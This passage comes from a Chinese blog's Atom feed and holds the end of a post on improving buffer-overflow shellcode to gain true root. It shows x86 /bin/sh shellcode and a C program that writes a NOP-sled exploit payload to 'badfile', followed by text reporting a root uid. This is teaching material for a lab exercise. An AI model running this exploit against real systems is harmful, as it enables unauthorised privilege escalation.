*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\xcd\x80&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* int    $0x80                   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* /bin/sh */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x31\xc0&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* xorl    %eax,%eax              */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x50&quot;&lt;/span&gt;                 &lt;span class=&quot;comment&quot;&gt;/* pushl   %eax                   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x68&quot;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&quot;//sh&quot;&lt;/span&gt;           &lt;span class=&quot;comment&quot;&gt;/* pushl   $0x68732f2f            */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x68&quot;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&quot;/bin&quot;&lt;/span&gt;           &lt;span class=&quot;comment&quot;&gt;/* pushl   $0x6e69622f            */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x89\xe3&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* movl    %esp,%ebx              */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x50&quot;&lt;/span&gt;                 &lt;span class=&quot;comment&quot;&gt;/* pushl   %eax                   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x53&quot;&lt;/span&gt;                 &lt;span class=&quot;comment&quot;&gt;/* pushl   %ebx                   */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x89\xe1&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* movl    %esp,%ecx              */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\x99&quot;&lt;/span&gt;                 &lt;span class=&quot;comment&quot;&gt;/* cdql                           */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\xb0\x0b&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* movb    $0x0b,%al              */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;\xcd\x80&quot;&lt;/span&gt;             &lt;span class=&quot;comment&quot;&gt;/* int     $0x80                  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*获取当前程序的ESP*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;get_sp&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    __asm__(&lt;span class=&quot;string&quot;&gt;&quot;movl %esp,%eax&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; **argv)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; buffer[&lt;span class=&quot;number&quot;&gt;517&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    FILE *badfile;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; addr = get_sp() + OFFSET; &lt;span class=&quot;comment&quot;&gt;//ESP + OFFSET为希望跳转到的地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;memset&lt;/span&gt;(&amp;amp;buffer, NOP, &lt;span class=&quot;number&quot;&gt;517&lt;/span&gt;);&lt;span class=&quot;comment&quot;&gt;//将buffer填充为NOP（No Operation）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i&amp;lt;&lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;; i+=&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        *((long *)&amp;amp;buffer[i]) = addr;&lt;span class=&quot;comment&quot;&gt;//填充溢出后希望跳转到的地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i&amp;lt;&lt;span class=&quot;built_in&quot;&gt;strlen&lt;/span&gt;(shellcode); i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        buffer[i+RANGE] = shellcode[i];&lt;span class=&quot;comment&quot;&gt;//填充shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    buffer[&lt;span class=&quot;number&quot;&gt;516&lt;/span&gt;] = &lt;span class=&quot;string&quot;&gt;&#39;\0&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;/*将buffer的内容写入badfile*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    badfile = fopen(&lt;span class=&quot;string&quot;&gt;&quot;./badfile&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;w&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    fwrite(buffer, &lt;span class=&quot;number&quot;&gt;517&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, badfile);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    fclose(badfile);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;再次运行stack程序，使用id命令查看当前用户uid和gid，可以发现现在两者都为&lt;code&gt;root(0)&lt;/code&gt;，从而真正获得了root权限。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/shellcode-improvement/shellcode_improv_2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;之前我提到了可以用shellcode进行缓冲区溢出漏洞的攻击，以达到获取root权限的目的。但是，之前的shellcode并不能获取真正的root权限，通过id命令可以发现shell的当前用户的uid和gid并非为&lt;code&gt;root(0)&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xtc0y.com1.z0.glb.clouddn.com/shellcode-improvement/shellcode_improv_1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="操作系统" scheme="http://blog.clarkhuang.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
+    
+    
+      <category term="Linux" scheme="http://blog.clarkhuang.com/tags/Linux/"/>
+    
+      <category term="C" scheme="http://blog.clarkhuang.com/tags/C/"/>
+    
+      <category term="BOFA" scheme="http://blog.clarkhuang.com/tags/BOFA/"/>
+    
+  </entry>
+  
+</feed>
